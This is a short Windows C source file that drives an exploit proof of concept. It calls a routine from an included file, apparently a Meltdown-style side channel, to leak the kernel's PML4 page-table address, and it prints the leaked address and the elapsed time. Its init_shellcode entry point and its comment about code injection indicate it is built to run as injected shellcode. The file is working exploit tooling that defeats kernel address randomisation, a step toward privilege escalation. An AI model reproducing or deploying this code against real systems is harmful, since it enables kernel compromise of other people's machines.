//////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <stdio.h>

#include "pml4-leak-melt.c"

//////////////////////////////////////////////////////////////////////////////

// Prototypes in order or ensure the function order when code is injected

void init_shellcode ( void );
unsigned int main ( void );

//////////////////////////////////////////////////////////////////////////////

//#define printf

//////////////////////////////////////////////////////////////////////////////

void init_shellcode ( void )
{
//  __debugbreak ();
  main ();
}

//////////////////////////////////////////////////////////////////////////////

unsigned int main ( void )
{
  unsigned __int64 initial_time;
  unsigned int candidate_entry;
  void *pml4_address;

// User message
  printf ( "\n" );
  printf ( "[+] Leaking PML4...\n" );

// Taking initial time
  initial_time = GetTickCount ();

//////////

// If PML4 address could be obtained
  if ( get_pml4_address ( &candidate_entry , &pml4_address ) == TRUE )
  {
  // Printing results
    printf ( "[+] Elapsed time: %lli ms\n" , GetTickCount () - initial_time );
    printf ( "[+] PML4: %I64x (entry %x)\n" , ( unsigned __int64 ) pml4_address , candidate_entry );
  }
  else
  {
  // Printing results
    printf ( "[-] Error: PML4 couldn't be leaked\n" );
  }

  return ( candidate_entry );
}

//////////////////////////////////////////////////////////////////////////////
